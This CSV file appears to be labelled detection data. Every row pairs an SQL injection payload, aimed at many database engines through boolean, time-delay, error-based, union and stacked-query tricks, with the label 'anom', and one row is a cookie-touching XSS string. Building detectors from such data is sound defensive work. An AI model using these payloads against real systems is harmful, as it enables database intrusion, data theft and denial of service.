payload,label
"1""))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((""staz"" like ""staz",anom
"1%"")));select (case when (5464=9350) then 5464 else cast(1 as int)/(select 0 from dual) end) from dual--",anom
"1"") as ymsc where 3694=3694 waitfor delay '0:0:5'--",anom
"1"" where 7045=7045;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",anom
1'+(select smze where 5616=5616;select (case when (7978=6009) then 7978 else 1/(select 0) end)--,anom
"1)) as xebl where 3105=3105 or 8421=(select count(*) from generate_series(1,5000000))--",anom
"1,(select (case when (4828=2600) then 1 else 1/(select 0) end))",anom
"-2783' where 1494=1494 union all select 1494,1494,1494,1494,1494,1494--",anom
1 rlike (select (case when (8314=5463) then 1 else 0x28 end)),anom
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",anom
"1' in boolean mode) and make_set(8403=8403,8899)#",anom
"1%'))) union all select null,null,null,null,null,null,null,null,null,null#",anom
"1') as ohnu where 4097=4097 union all select null,null,null,null,null,null,null,null,null--",anom
-2120') or 8734=8844#,anom
"1 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)-- fzhj",anom
"-5131'))) union all select 4854,4854,4854,4854,4854,4854,4854#",anom
"1"" rlike sleep(5) and ""rylv"" like ""rylv",anom
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",anom
-8051) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (5637=5637,anom
"1'||(select 'djoe' from dual where 8063=8063 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))||'",anom
"1) where 2781=2781 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
"1')) as ypgz where 8704=8704;select benchmark(5000000,md5(0x4c4d6142))--",anom
"1"")) as cduw where 4495=4495;select pg_sleep(5)--",anom
"-2549') as zfnf where 1993=1993 union all select 1993,1993,1993,1993,1993,1993--",anom
"-1598))) union all select 9418,9418,9418,9418,9418,9418,9418#",anom
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""ejmj"" like ""ejmj",anom
"1' in boolean mode) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"-9596) where 3425=3425 union all select 3425,3425,3425,3425,3425,3425#",anom
"1' in boolean mode);select * from generate_series(1431,1431,case when (1431=7822) then 1 else 0 end) limit 1--",anom
1' in boolean mode);(select * from (select(sleep(5)))acdk)#,anom
"1%""))) union all select null,null,null,null#",anom
"1%"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""%""=""",anom
"1"" or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""bkoq""=""bkoq",anom
"1) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7182=7182",anom
"-4825%') union all select 6804,6804,6804,6804,6804,6804,6804--",anom
"1' in boolean mode);select benchmark(5000000,md5(0x714e4153))#",anom
1) as vxsh where 4706=4706;if(6624=4232) select 6624 else drop function xyyt--,anom
"-5998"") as gazd where 2814=2814 union all select 2814,2814,2814,2814,2814,2814,2814--",anom
1 where 7464=7464 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,anom
"1"") as ronb where 9368=9368;(select * from (select(sleep(5)))srmq)--",anom
"1' union all select null,null,null--",anom
"1""))) and make_set(6751=8128,8128) and (((""uhiy""=""uhiy",anom
"1"") where 7471=7471 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",anom
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",anom
"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (5468=5468",anom
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",anom
"1')) as mdtm where 1393=1393 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"1"")));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",anom
"1%"" or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"1"")) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((""mjkl""=""mjkl",anom
"1) as udjn where 6871=6871 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",anom
1;select sleep(5)-- waln,anom
"-5702'))) union all select 7806,7806,7806,7806,7806--",anom
"-4546') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",anom
1'||(select 'yyil' from dual where 3121=3121;if(2695=9045) select 2695 else drop function qmno--,anom
"1 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",anom
"1%"")) union all select null,null,null,null,null,null,null,null,null#",anom
"1"" and (select * from (select(sleep(5)))fzno) and ""gddl"" like ""gddl",anom
"-4669' union all select 9387,9387,9387,9387,9387,9387,9387,9387,9387,9387--",anom
1') where 5145=5145;if(2823=3532) select 2823 else drop function kmqw--,anom
"1%"")));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
1'||(select 'hkvl' from dual where 8882=8882;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,anom
"-9389' where 5713=5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",anom
"-9098'||(select 'xodn' from dual where 8202=8202 union all select 8202,8202,8202,8202,8202,8202,8202--",anom
"1%"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",anom
"1""))) and 7533=7533 and (((""xopd""=""xopd",anom
1 where 9774=9774;begin dbms_lock.sleep(5); end--,anom
"1"";begin dbms_lock.sleep(5); end and ""xlvn""=""xlvn",anom
"-3637"" or (8459=8459)*4906",anom
"1)) as rsnb where 3168=3168 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",anom
-3166'||(select 'mtan' from dual where 9420=9420 union all select 9420#,anom
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('dssx' like 'dssx",anom
"1 where 7802=7802;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",anom
1')) rlike (select (case when (6205=1384) then 1 else 0x28 end)) and (('ahjf'='ahjf,anom
1 where 5443=5443;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,anom
"1)) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"-6656"") union all select 3931#",anom
"1')) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (('fdoc' like 'fdoc",anom
1'+(select twyt where 3376=3376 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+',anom
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""eslj"" like ""eslj",anom
"1"") as rqpp where 9383=9383 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"1' and elt(4249=4249,7259) and 'nsbj' like 'nsbj",anom
1' where 8945=8945 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,anom
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('rspz'='rspz",anom
-7369 or 9323=9323#,anom
"1"") rlike (select * from (select(sleep(5)))vwyq)#",anom
-1816%'))) union all select 2072--,anom
"1%"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"1%')) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",anom
"-9947""))) union all select 8765,8765,8765,8765,8765#",anom
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""seci""=""seci",anom
"1"")) as uycc where 4364=4364 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),anom
"-9886%'))) union all select 5191,5191,5191,5191,5191,5191,5191--",anom
"-8209) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
"1"") where 6018=6018 and 7533=7533--",anom
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""wjhj""=""wjhj",anom
"1'));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (('rkoe'='rkoe",anom
"1"")) as qhnb where 8302=8302 and (3020=3020)*6703--",anom
"1%"" union all select null,null#",anom
1 and 6802=3592--,anom
"1' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"-9180"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
1) as azoo where 8933=8933 and (3020=3020)*6703--,anom
"1"") or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (""ponv""=""ponv",anom
"1"" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ""cgps"" like ""cgps",anom
"-9659))) union all select 8665,8665,8665,8665,8665,8665,8665--",anom
"1"" or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
"1"";select sleep(5)",anom
1 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# lexm,anom
"1"")) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",anom
"-3756') union all select 1034,1034,1034--",anom
1) or sleep(5) and (2211=2211,anom
1) where 5418=5418 union all select null--,anom
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('xaoi'='xaoi",anom
"1%"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
-7054) as gzvf where 9146=9146 or 3038=3038,anom
1'||(select 'oxdh' where 6967=6967 and sleep(5)#,anom
"1"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""wvkp"" like ""wvkp",anom
-7111' or (8459=8459)*4906,anom
1%')));select (case when (9746=8055) then 9746 else 1/(select 0) end)--,anom
1') and (1471=7892)*7892 and ('kkok' like 'kkok,anom
"1'+(select 'zkuf' where 3591=3591 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",anom
"1%"" and 9198=9198--",anom
"1"")) as rign where 1604=1604 and 3661=3054--",anom
"-9740"")) as pxkx where 5305=5305 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",anom
"1""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""ffcf"" like ""ffcf",anom
"-3116""))) union all select 4600,4600,4600,4600--",anom
"-3501""))) or (6789=6990)*6990 and (((""jnnc"" like ""jnnc",anom
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",anom
">""<img src=&{document.cookie=true;};>",anom
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ""cbck"" like ""cbck",anom
"-3037) where 9024=9024 union all select 9024,9024--",anom
1') union all select null--,anom
"1' and elt(1533=5695,5695) and 'ycgi'='ycgi",anom
-7034'))) union all select 4023#,anom
"1%"") union all select null,null,null#",anom
1'||(select 'kuxp' where 7123=7123 and 1688=4200#,anom
"1'))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((('vfnl'='vfnl",anom
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",anom
"1'+(select jqyo where 4426=4426 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",anom
"1 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",anom
"1"";select sleep(5)#",anom
"1) where 2473=2473 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",anom
"-6534%')) or make_set(4107=9457,9457) and (('%'='",anom
"-9508) union all select 9950,9950,9950,9950,9950,9950,9950#",anom
1')) and 3814=4272--,anom
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))-- dkwz",anom
"1 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",anom
1))) rlike sleep(5) and (((6790=6790,anom
-4058) union all select 9184--,anom
"-6848"")) or 4071=5312",anom
"1%"") and (3020=3020)*6703 and (""%""=""",anom
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('oxvd' like 'oxvd",anom
"1"")) as xbhp where 7527=7527;select count(*) from generate_series(1,5000000)--",anom
"-1763"") or elt(1032=1032,3623) and (""nqvv""=""nqvv",anom
"1"") as awdg where 9512=9512;select (case when (7169=7785) then 1 else 7169*(select 7169 from master..sysdatabases) end)--",anom
"1"" where 1132=1132 or 6793=(select 6793 from pg_sleep(5))--",anom
"1"")) and elt(1210=1210,sleep(5)) and ((""afby""=""afby",anom
"1"") where 8153=8153;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",anom
"-5073"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""kbab"" like ""kbab",anom
"1"";(select * from (select(sleep(5)))acdk)#",anom
"1,iif(6625=6625,1,1/0)",anom
-2431') or 8571=8571--,anom
"1""))) rlike (select (case when (6915=4531) then 1 else 0x28 end)) and (((""jzzu""=""jzzu",anom
1' in boolean mode) and 7533=7533#,anom
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",anom
"1""))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""agaz""=""agaz",anom
"1"") where 8095=8095 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",anom
"1 and elt(2770=3669,3669)# sfls",anom
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",anom
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",anom
1');begin dbms_lock.sleep(5); end and ('uxzv'='uxzv,anom
